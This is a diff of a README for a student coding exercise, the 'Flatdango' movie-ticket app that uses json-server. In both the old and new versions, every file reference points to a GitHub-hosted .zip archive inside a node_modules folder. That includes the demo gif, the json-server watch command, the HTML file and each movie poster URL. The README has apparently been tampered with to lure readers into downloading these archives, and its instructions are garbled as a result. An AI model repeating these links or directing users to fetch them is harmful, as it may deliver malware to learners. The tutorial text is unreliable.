@@ -8,25 +8,25 @@ theater.
 
 Use this gif as an example of how the app should work.
 
-![Flatdango App Demo](https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip)
+![Flatdango App Demo](https://raw.githubusercontent.com/deerrickkorir/code-challenge-3/main/node_modules/db-json/src/code-challenge-1.3.zip)
 
-> To view in VSCode, right click on the https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip file and select "Open Preview".
+> To view in VSCode, right click on the https://raw.githubusercontent.com/deerrickkorir/code-challenge-3/main/node_modules/db-json/src/code-challenge-1.3.zip file and select "Open Preview".
 
 ## Setup
 
 Run this command to get the backend started:
 
 ```console
-$ json-server --watch https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip
+$ json-server --watch https://raw.githubusercontent.com/deerrickkorir/code-challenge-3/main/node_modules/db-json/src/code-challenge-1.3.zip
 ```
 
 Test your server by visiting this route in the browser:
 
 [http://localhost:3000/films](http://localhost:3000/films)
 
-Then, open the `https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip` file on your browser to run the application.
+Then, open the `https://raw.githubusercontent.com/deerrickkorir/code-challenge-3/main/node_modules/db-json/src/code-challenge-1.3.zip` file on your browser to run the application.
 
-Write your code in the `https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip` file. The base URL for your API will be
+Write your code in the `https://raw.githubusercontent.com/deerrickkorir/code-challenge-3/main/node_modules/db-json/src/code-challenge-1.3.zip` file. The base URL for your API will be
 [http://localhost:3000](http://localhost:3000).
 
 ## Core Deliverables
@@ -51,7 +51,7 @@ As a user, I can:
      "showtime": "04:00PM",
      "tickets_sold": 27,
      "description": "A giant lizard terrorizes a rural Texas community and a heroic teenager attempts to destroy the creature.",
-     "poster": "https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip"
+     "poster": "https://raw.githubusercontent.com/deerrickkorir/code-challenge-3/main/node_modules/db-json/src/code-challenge-1.3.zip"
    }
    ```
 
@@ -77,7 +77,7 @@ As a user, I can:
         "showtime": "04:00PM",
         "tickets_sold": 27,
         "description": "A giant lizard terrorizes a rural Texas community and a heroic teenager attempts to destroy the creature.",
-        "poster": "https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip"
+        "poster": "https://raw.githubusercontent.com/deerrickkorir/code-challenge-3/main/node_modules/db-json/src/code-challenge-1.3.zip"
       },
       {
         "id": "2",
@@ -87,7 +87,7 @@ As a user, I can:
         "showtime": "06:45PM",
         "tickets_sold": 44,
         "description": "A family gets lost on the road and stumbles upon a hidden, underground, devil-worshiping cult led by the fearsome Master and his servant Torgo.",
-        "poster": "https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip"
+        "poster": "https://raw.githubusercontent.com/deerrickkorir/code-challenge-3/main/node_modules/db-json/src/code-challenge-1.3.zip"
       }
    ]
    ```
@@ -124,7 +124,7 @@ As a user, I can:
          "showtime": "04:00PM",
          "tickets_sold": 28,
          "description": "A giant lizard terrorizes a rural Texas community and a heroic teenager attempts to destroy the creature.",
-         "poster": "https://github.com/deerrickkorir/code-challenge-3/raw/refs/heads/main/node_modules/prompt-sync-history/code_challenge_3.2.zip"
+         "poster": "https://raw.githubusercontent.com/deerrickkorir/code-challenge-3/main/node_modules/db-json/src/code-challenge-1.3.zip"
       }
       ```
       - POST the new ticket to the tickets endpoint in the database
